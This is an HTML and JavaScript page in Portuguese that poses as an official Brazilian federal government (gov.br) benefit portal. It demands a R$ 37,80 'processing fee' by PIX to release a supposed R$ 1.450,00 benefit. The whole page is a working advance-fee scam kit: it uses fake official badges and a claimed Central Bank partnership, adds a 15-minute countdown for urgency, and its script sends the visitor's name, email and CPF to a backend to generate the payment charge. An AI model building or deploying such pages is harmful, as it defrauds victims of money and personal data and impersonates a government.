<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento PIX - Governo Federal</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }
        
        body {
            background-color: #f8f9fa;
            color: #333;
            line-height: 1.6;
        }
        
        .container {
            max-width: 800px;
            padding: 0 20px;
            margin: auto;
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid #eaeaea;
            margin-bottom: 20px;
        }
        
        .logo-container {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .logo {
            height: 30px;
        }
        
        .badge {
            background-color: #1351b4;
            color: white;
            font-size: 10px;
            padding: 3px 6px;
            border-radius: 4px;
            font-weight: 600;
        }
        
        .security-badge {
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 12px;
            color: #28a745;
        }
        
        .approval-banner {
            background: linear-gradient(135deg, #4e9cff, #1351b4);
            color: white;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            margin-bottom: 20px;
            box-shadow: 0 4px 12px rgba(19, 81, 180, 0.2);
        }
        
        .approval-banner h1 {
            font-size: 22px;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .approval-badge {
            display: inline-flex;
            align-items: center;
            background-color: rgba(255, 255, 255, 0.2);
            padding: 8px 12px;
            border-radius: 20px;
            margin-bottom: 15px;
            font-size: 14px;
        }
        
        .benefit-amount {
            font-size: 36px;
            font-weight: 700;
            margin: 15px 0;
        }
        
        .urgency-alert {
            background-color: #fff8e6;
            border-left: 4px solid #ffc107;
            padding: 12px;
            margin: 20px 0;
            border-radius: 0 8px 8px 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .urgency-alert p {
            font-size: 13px;
            color: #d32f2f;
            font-weight: 500;
            margin: 0;
        }
        
        .pix-container {
            background-color: white;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
            text-align: center;
        }
        
        .pix-code {
            background-color: #f5f5f5;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            font-family: monospace;
            font-size: 18px;
            word-break: break-all;
        }
        
        .pix-qrcode {
            width: 200px;
            height: 200px;
            margin: 0 auto;
            background-color: #eee;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        
        .pix-qrcode img {
            max-width: 100%;
            max-height: 100%;
        }
        
        .pix-instructions {
            text-align: left;
            margin: 20px 0;
            font-size: 14px;
        }
        
        .pix-instructions ol {
            padding-left: 20px;
        }
        
        .pix-instructions li {
            margin-bottom: 10px;
        }
        
        .copy-button {
            background-color: #1351b4;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 500;
            margin-bottom: 20px;
            transition: background-color 0.3s;
        }
        
        .copy-button:hover {
            background-color: #0d3d8c;
        }
        
        .verified-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            color: #28a745;
            font-weight: 500;
            margin: 10px 0;
        }
        
        .timer {
            font-size: 18px;
            font-weight: 600;
            color: #d32f2f;
            margin: 15px 0;
        }
        
        .footer {
            text-align: center;
            padding: 20px 0;
            font-size: 12px;
            color: #999;
            border-top: 1px solid #eee;
            margin-top: 30px;
        }
        
        #payment-confirmed {
            display: none;
            background-color: #e8f5e9;
            border-left: 4px solid #28a745;
            padding: 15px;
            margin: 20px 0;
            border-radius: 0 8px 8px 0;
            animation: fadeIn 0.5s;
        }
        
        #loading-pix {
            text-align: center;
            padding: 20px;
        }
        
        .spinner {
            border: 4px solid rgba(19, 81, 180, 0.1);
            border-radius: 50%;
            border-top: 4px solid #1351b4;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .error-message {
            color: #d32f2f;
            background-color: #ffebee;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            text-align: center;
        }

        .retry-button {
            background-color: #d32f2f;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.3s;
        }

        .retry-button:hover {
            background-color: #b71c1c;
        }

        .debug-info {
            font-size: 12px;
            color: #666;
            margin-top: 5px;
            text-align: left;
        }

        .connection-alert {
            background-color: #ffebee;
            border-left: 4px solid #f44336;
            padding: 12px;
            margin: 10px 0;
            border-radius: 0 8px 8px 0;
            display: none;
        }
        .audio-container {
            max-width: 500px;
            margin: 30px auto;
            padding: 20px;
            background-color: #f8f9fa;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            text-align: center;
        }
        
        .audio-title {
            color: #2c3e50;
            margin-bottom: 15px;
        }
        
        audio {
            width: 100%;
            margin: 10px 0;
        }
        
        .audio-description {
            color: #666;
            font-size: 14px;
            margin-top: 15px;
        }
    </style>
</head>
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="logo-container">
                <img src="imagens/Gov.br.png" alt="Governo Federal" class="logo">
                <span class="badge">OFICIAL</span>
            </div>
            <div class="security-badge">
                <span>Ambiente seguro</span>
            </div>
        </header>

        <div class="approval-banner">
            <div class="approval-badge">
                <span>PAGAMENTO REQUERIDO</span>
            </div>
            <h1>Confirme seu pagamento via PIX</h1>
            <p class="benefit-info">Taxa de processamento para liberação do benefício:</p>
            <div class="benefit-amount">R$ 37,80</div>
            <p class="benefit-info">Valor do benefício a ser liberado: <strong>R$ 1.450,00</strong></p>
        </div>

        <div class="urgency-alert">
            <p><strong>Atenção:</strong> Você tem apenas <span id="tempo-restante">15 minutos</span> para confirmar o pagamento</p>
        </div>

    <!-- Exemplo com autoplay (usar com cautela) -->
    <div class="audio-container" style="margin-top: 40px;">
        <h3 class="audio-title"></h3>
        
        <audio controls autoplay muted loop>
            <source src="audio/1.mp3" type="audio/mpeg">
        </audio>
    </div>
        <div class="pix-container">
            <h2>Pagamento via PIX</h2>
            <p>Escaneie o QR Code ou copie o código abaixo para realizar o pagamento</p>
            
            <div class="connection-alert" id="connection-alert">
                <p><strong>Problema de conexão:</strong> Verifique sua internet e tente novamente.</p>
            </div>
            
            <div id="loading-pix">
                <div class="spinner"></div>
                <p>Gerando seu código PIX...</p>
            </div>
            
            <div id="pix-content" style="display: none;">
                <div class="pix-qrcode">
                    <img id="qr-code-img" alt="QR Code PIX">
                </div>
                
                <div class="pix-code" id="pix-code-text">
                    Carregando código PIX...
                </div>
                
                <button class="copy-button" onclick="copyPixCode()">
                    COPIAR CÓDIGO PIX
                </button>
                
                <div class="verified-badge">
                    <img src="imagens/pix.jpeg" alt="Verificado" width="16">
                    <span>Chave PIX válida por <span id="expiration-time">15 minutos</span></span>
                </div>
                
                <div class="timer">
                    ⏳ Tempo restante: <span id="countdown">15:00</span>
                </div>
                
                <div class="pix-instructions">
                    <h3>Como pagar:</h3>
                    <ol>
                        <li>Abra o aplicativo do seu banco</li>
                        <li>Selecione a opção PIX</li>
                        <li>Escaneie o QR Code ou cole o código copiado</li>
                        <li>Confira os dados e confirme o pagamento</li>
                        <li>Aguarde a confirmação automática</li>
                    </ol>
                </div>
            </div>
            
            <div id="payment-confirmed">
                <p>✅ Pagamento confirmado! Redirecionando para liberação do benefício...</p>
            </div>

            <div id="error-container" style="display: none;"></div>
        </div>

        <footer class="footer">
            <p>Sistema de Consulta de Benefícios - Governo Federal</p>
            <p>Parceria com Banco Central do Brasil</p>
        </footer>
    </div>

    <script>
        // Variáveis globais
        let paymentId;
        let checkInterval;
        let loadingTimeout;
        const paymentAmount = 37.80;
        const backendUrl = 'http://localhost:5000';

        // Elementos DOM
        const loadingElement = document.getElementById('loading-pix');
        const pixContentElement = document.getElementById('pix-content');
        const qrCodeImg = document.getElementById('qr-code-img');
        const pixCodeText = document.getElementById('pix-code-text');
        const countdownElement = document.getElementById('countdown');
        const expirationElement = document.getElementById('expiration-time');
        const paymentConfirmed = document.getElementById('payment-confirmed');
        const errorContainer = document.getElementById('error-container');
        const connectionAlert = document.getElementById('connection-alert');

        // Verificar conexão com a internet
        function checkConnection() {
            if (!navigator.onLine) {
                showConnectionError();
                return false;
            }
            connectionAlert.style.display = 'none';
            return true;
        }

        function showConnectionError() {
            connectionAlert.style.display = 'flex';
            loadingElement.style.display = 'none';
            pixContentElement.style.display = 'none';
            clearTimeout(loadingTimeout);
        }

        // Monitorar mudanças na conexão
        window.addEventListener('online', () => {
            connectionAlert.style.display = 'none';
            generatePix();
        });

        window.addEventListener('offline', showConnectionError);

        // Função para exibir erros
        function showError(message, details = null) {
            errorContainer.innerHTML = `
                <div class="error-message">
                    <p><strong>Erro:</strong> ${message}</p>
                    ${details ? `<div class="debug-info">${details}</div>` : ''}
                    <button class="retry-button" onclick="generatePix()">Tentar novamente</button>
                </div>
            `;
            errorContainer.style.display = 'block';
            loadingElement.style.display = 'none';
            pixContentElement.style.display = 'none';
            console.error('Erro:', message, details);
        }

        // Função para copiar código PIX
        function copyPixCode() {
            const code = pixCodeText.textContent.trim();
            navigator.clipboard.writeText(code)
                .then(() => {
                    alert('Código PIX copiado! Cole no seu aplicativo bancário.');
                    console.log('Código PIX copiado:', code.substring(0, 20) + '...');
                })
                .catch((err) => {
                    const textarea = document.createElement('textarea');
                    textarea.value = code;
                    document.body.appendChild(textarea);
                    textarea.select();
                    const success = document.execCommand('copy');
                    document.body.removeChild(textarea);
                    
                    if (success) {
                        alert('Código copiado!');
                    } else {
                        showError('Falha ao copiar código. Tente manualmente.');
                        console.error('Falha ao copiar código:', err);
                    }
                });
        }

        // Contador regressivo
        function startCountdown(expirationDate) {
            const updateTimer = () => {
                const now = new Date();
                const diff = expirationDate - now;
                
                if (diff <= 0) {
                    clearInterval(checkInterval);
                    showError('Tempo esgotado! Por favor, inicie um novo pagamento.');
                    console.log('Tempo de pagamento expirado');
                    return;
                }
                
                const minutes = Math.floor(diff / 60000);
                const seconds = Math.floor((diff % 60000) / 1000);
                
                countdownElement.textContent = 
                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                document.getElementById('tempo-restante').textContent = 
                    `${minutes} minuto${minutes !== 1 ? 's' : ''}`;
            };
            
            updateTimer();
            return setInterval(updateTimer, 1000);
        }

        // Verificação do pagamento
        function startPaymentCheck() {
            console.log('Iniciando verificação de pagamento para ID:', paymentId);
            
            checkInterval = setInterval(async () => {
                try {
                    console.log('Verificando status do pagamento...');
                    const response = await fetch(`${backendUrl}/verificar-pagamento/${paymentId}`, {
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        }
                    });
                    
                    if (!response.ok) {
                        throw new Error(`Erro HTTP: ${response.status}`);
                    }
                    
                    const data = await response.json();
                    console.log('Status do pagamento:', data.status);
                    
                    if (data.status === 'approved') {
                        clearInterval(checkInterval);
                        paymentConfirmed.style.display = 'block';
                        localStorage.setItem('paymentStatus', 'approved');
                        
                        console.log('Pagamento aprovado, redirecionando...');
                        setTimeout(() => {
                            window.location.href = "confirmacao.html";
                        }, 2000);
                    }
                } catch (error) {
                    console.error('Erro ao verificar pagamento:', error);
                    showError('Falha ao verificar pagamento. Tentando novamente...', error.message);
                }
            }, 5000);
        }

        // Função principal para gerar PIX
        async function generatePix() {
            if (!checkConnection()) return;

            // Limpar estados anteriores
            clearTimeout(loadingTimeout);
            errorContainer.style.display = 'none';
            loadingElement.innerHTML = `
                <div class="spinner"></div>
                <p>Gerando seu código PIX...</p>
            `;
            loadingElement.style.display = 'block';
            pixContentElement.style.display = 'none';
            paymentConfirmed.style.display = 'none';

            // Timeout para evitar carregamento infinito
            loadingTimeout = setTimeout(() => {
                showError('O servidor está demorando muito para responder. Tente novamente.');
            }, 15000); // 15 segundos

            try {
                const userEmail = localStorage.getItem('userEmail') || 'cliente@exemplo.com';
                const userName = localStorage.getItem('userName') || 'Cliente GovBR';
                const userCPF = localStorage.getItem('userCPF') || '';
                
                console.log('Enviando requisição PIX para:', `${backendUrl}/gerar-pix`);
                console.log('Dados enviados:', {
                    email: userEmail,
                    nome: userName,
                    cpf: userCPF,
                    valor: paymentAmount
                });
                
                const response = await fetch(`${backendUrl}/gerar-pix`, {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({ 
                        email: userEmail,
                        nome: userName,
                        cpf: userCPF,
                        valor: paymentAmount
                    })
                });

                const data = await response.json();
                
                if (!response.ok || !data.success) {
                    const errorMsg = data.error || 'Falha ao gerar PIX';
                    const errorDetails = data.details || `Status HTTP: ${response.status}`;
                    throw new Error(`${errorMsg} (${errorDetails})`);
                }

                // Verificação mais robusta dos dados
                if (!data.qr_base64) {
                    throw new Error('QR Code não foi gerado pelo servidor');
                }
                if (!data.pix_code) {
                    throw new Error('Código PIX não foi gerado pelo servidor');
                }
                if (!data.payment_id) {
                    throw new Error('ID do pagamento não foi retornado');
                }

                paymentId = data.payment_id;
                qrCodeImg.src = `data:image/png;base64,${data.qr_base64}`;
                pixCodeText.textContent = data.pix_code;
                
                const expirationDate = new Date(data.expiration);
                expirationElement.textContent = Math.ceil((expirationDate - new Date()) / 60000) + ' minutos';
                
                loadingElement.style.display = 'none';
                pixContentElement.style.display = 'block';
                
                // Iniciar contagem regressiva e verificação
                startCountdown(expirationDate);
                startPaymentCheck();

            } catch (error) {
                console.error('Erro detalhado:', error);
                showError(
                    error.message || 'Falha ao gerar cobrança PIX', 
                    error.details || 'Tente novamente ou entre em contato com o suporte'
                );
            } finally {
                clearTimeout(loadingTimeout);
            }
        }

        // Inicialização
        document.addEventListener('DOMContentLoaded', () => {
            // Verificar se já tem um pagamento aprovado
            if (localStorage.getItem('paymentStatus') === 'approved') {
                window.location.href = "confirmacao.html";
            } else {
                generatePix();
            }
        });
    </script>
</body>
</html>